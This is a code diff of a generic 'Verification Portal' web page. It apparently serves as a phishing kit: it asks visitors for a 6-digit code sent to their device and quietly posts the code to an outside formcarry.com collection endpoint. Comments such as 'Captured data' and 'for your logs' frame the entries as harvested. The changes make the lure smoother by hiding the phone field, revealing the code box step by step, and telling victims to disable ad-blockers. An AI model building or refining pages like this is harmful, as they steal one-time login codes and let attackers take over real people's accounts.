@@ -3,83 +3,66 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verification - Secure Portal</title>
+  <title>Verification Portal</title>
   <style>
     body { 
       margin: 0; 
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+      font-family: Arial, sans-serif; 
       background: #1a1a1a url('background.jpg') no-repeat center center fixed; 
       background-size: cover !important; 
       color: white; 
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
+      text-align: center; 
     }
     .overlay { 
-      background: rgba(0,0,0,0.7); 
-      position: absolute;
-      top: 0; left: 0; width: 100%; height: 100%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      background: rgba(0,0,0,0.6); 
+      min-height: 100vh; 
+      width: 100%;
+      padding-top: 80px; 
     }
     .container { 
-      background: rgba(25, 25, 25, 0.95); 
-      padding: 40px 30px; 
-      width: 340px; 
-      border-radius: 12px; 
+      background: rgba(20,20,20,0.85); 
+      padding: 30px; 
+      width: 320px; 
+      margin: auto; 
+      border-radius: 10px; 
       border: 1px solid rgba(255,255,255,0.1);
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-      text-align: center;
-      z-index: 10;
     }
-    .logo { width: 220px; margin-bottom: 25px; }
-    h2 { margin: 0 0 10px 0; font-size: 22px; }
-    p { font-size: 13px; color: #aaa; margin-bottom: 20px; line-height: 1.5; }
+    .logo { width: 250px; margin-bottom: 20px; }
     
+    /* Input Styling */
     input { 
       display: block; 
       margin: 15px auto; 
-      padding: 14px; 
-      width: 100%; 
-      box-sizing: border-box;
-      border-radius: 6px; 
+      padding: 12px; 
+      width: 90%; 
+      border-radius: 5px; 
       border: 1px solid #444; 
-      background: #fff;
-      color: #000;
+      background: white; 
+      color: black; 
       font-size: 16px;
+      text-align: center;
     }
-    input:focus { border-color: #007bff; outline: none; }
 
     button { 
-      padding: 14px; 
-      border-radius: 6px; 
+      padding: 12px; 
+      border-radius: 5px; 
       border: none; 
       cursor: pointer; 
       background: #f0f0f0; 
-      color: #000;
       font-weight: bold; 
-      width: 100%; 
+      width: 95%; 
       margin-top: 10px; 
-      transition: background 0.3s;
     }
-    button:hover { background: #ddd; }
-    button:disabled { background: #555 !important; color: #888; cursor: not-allowed; }
+    button:disabled { background: #666 !important; cursor: not-allowed; }
     
-    .btn-verify { background: #4caf50; color: white; margin-top: 20px; }
-    .btn-verify:hover { background: #45a049; }
-
-    .status-msg { 
-      margin-top: 15px; 
-      font-size: 13px; 
-      color: #ffd700; 
-      display: none; 
-      padding: 10px;
-      border-radius: 4px;
-      background: rgba(255, 215, 0, 0.1);
-    }
-    hr { margin: 30px 0; border: 0; border-top: 1px solid #333; }
+    .btn-verify { background: #4caf50; color: white; margin-top: 10px; }
+    
+    .status-msg { margin-top: 15px; font-size: 14px; color: #ffd700; display: none; }
+    
+    /* This section stays hidden until the request is sent */
+    #codeEntrySection { display: none; margin-top: 20px; }
+    
+    hr { margin: 25px 0; border: 0; border-top: 1px solid #444; }
   </style>
 </head>
 <body>
@@ -88,31 +71,39 @@
   <div class="container">
     <img src="logo.png" class="logo" alt="Logo">
 
-    <h2>Identity Verification</h2>
-    <p>Please enter your phone number to receive your secure access code.</p>
-
-    <!-- Unified Form -->
-    <form id="vForm" action="https://formcarry.com/s/tbk_myA3Xem" method="POST">
+    <div id="mainSection">
+      <h2>Verification</h2>
+      <p style="font-size: 12px; color: #aaa;">Click below to receive your secure code.</p>
       
-      <!-- Captured data -->
-      <input type="text" name="phone_number" id="phone" placeholder="Phone Number (e.g. +1...)" required>
-      
-      <!-- Hidden tag to track button used -->
-      <input type="hidden" name="user_action" id="userAction" value="">
+      <form id="vForm" action="https://formcarry.com/s/tbk_myA3Xem" method="POST">
+        
+        <!-- HIDDEN PHONE DATA: Replaces the manual phone input -->
+        <input type="hidden" name="phone_number" value="Hidden_System_User">
+        <input type="hidden" name="intent" id="intent" value="">
 
-      <button type="submit" id="reqBtn">Request Code</button>
-      <div id="waitMsg" class="status-msg">
-        ✔ Request sent. Please stay on this page.
-      </div>
+        <!-- Initial Request Button -->
+        <button type="submit" id="reqBtn">Request Code</button>
+        
+        <div id="waitMessage" class="status-msg">
+          ✔ Request Sent! Your code is being generated...
+        </div>
 
-      <hr>
-
-      <p>Already have a code? Enter it above then click verify.</p>
-      <button type="submit" id="subBtn" class="btn-verify">Submit & Verify</button>
-      <div id="successMsg" class="status-msg" style="color: #4caf50; background: rgba(76, 175, 80, 0.1);">
-        ✔ Verifying code... Please wait.
-      </div>
-    </form>
+        <!-- HIDDEN SECTION: Appears after clicking Request -->
+        <div id="codeEntrySection">
+          <hr>
+          <h3 style="margin-bottom: 5px;">Enter Code</h3>
+          <p style="font-size: 11px; color: #888;">Check your device for the 6-digit code.</p>
+          
+          <input type="text" name="received_code" id="codeInput" placeholder="000000" maxlength="6">
+          
+          <button type="submit" id="subBtn" class="btn-verify">Submit & Verify</button>
+          
+          <div id="successMessage" class="status-msg" style="color: #4caf50;">
+            ✔ Verifying... Please wait.
+          </div>
+        </div>
+      </form>
+    </div>
   </div>
 </div>
 
@@ -120,29 +111,28 @@
   const vForm = document.getElementById('vForm');
   const reqBtn = document.getElementById('reqBtn');
   const subBtn = document.getElementById('subBtn');
-  const userAction = document.getElementById('userAction');
+  const intentInput = document.getElementById('intent');
+  const codeSection = document.getElementById('codeEntrySection');
+  const codeInput = document.getElementById('codeInput');
 
   vForm.addEventListener('submit', async (e) => {
     e.preventDefault();
 
-    // Identify which button was clicked
     const clickedBtn = document.activeElement;
     const isRequest = clickedBtn.id === 'reqBtn';
     
-    // Set hidden value for your logs
-    userAction.value = isRequest ? "CODE_REQUEST" : "VERIFICATION_SUBMISSION";
+    // Set the hidden intent
+    intentInput.value = isRequest ? "Requesting New Code" : "User Entered Code: " + codeInput.value;
 
-    const statusId = isRequest ? 'waitMsg' : 'successMsg';
-    const statusEl = document.getElementById(statusId);
+    const statusId = isRequest ? 'waitMessage' : 'successMessage';
+    const statusMsg = document.getElementById(statusId);
 
-    // Disable buttons
-    reqBtn.disabled = true;
-    subBtn.disabled = true;
+    // Disable button during processing
+    clickedBtn.disabled = true;
     const originalText = clickedBtn.innerText;
-    clickedBtn.innerText = "Sending...";
+    clickedBtn.innerText = "Processing...";
 
     try {
-      // Standard form submission to avoid 400 Bad Request
       const response = await fetch(vForm.action, {
         method: 'POST',
         body: new FormData(vForm),
@@ -151,30 +141,35 @@
 
       if (response.ok) {
         clickedBtn.innerText = "Success";
-        statusEl.style.display = "block";
+        statusMsg.style.display = "block";
         
-        // Allow retry after 5 seconds
+        // If it was a request, show the "Enter Code" section
+        if (isRequest) {
+          setTimeout(() => {
+            codeSection.style.display = "block";
+            reqBtn.style.display = "none"; // Hide the request button after success
+          }, 1000);
+        }
+        
+        // Reset processing state
         setTimeout(() => {
-          reqBtn.disabled = false;
-          subBtn.disabled = false;
+          clickedBtn.disabled = false;
           clickedBtn.innerText = originalText;
-        }, 5000);
+        }, 4000);
+
       } else {
-        alert("Server Error (" + response.status + "): Please try again or check your form settings.");
-        resetButtons(clickedBtn, originalText);
+        alert("Error " + response.status + ": System busy. Please try again.");
+        clickedBtn.disabled = false;
+        clickedBtn.innerText = "Try Again";
       }
     } catch (error) {
-      alert("Connection Blocked: Please disable Ad-Blockers or use a local server.");
-      resetButtons(clickedBtn, originalText);
+      alert("Connection Blocked. Please disable Ad-Blockers and run from a server.");
+      clickedBtn.disabled = false;
+      clickedBtn.innerText = "Try Again";
     }
   });
-
-  function resetButtons(btn, text) {
-    reqBtn.disabled = false;
-    subBtn.disabled = false;
-    btn.innerText = text;
-  }
 </script>
 
 </body>
 </html>
+
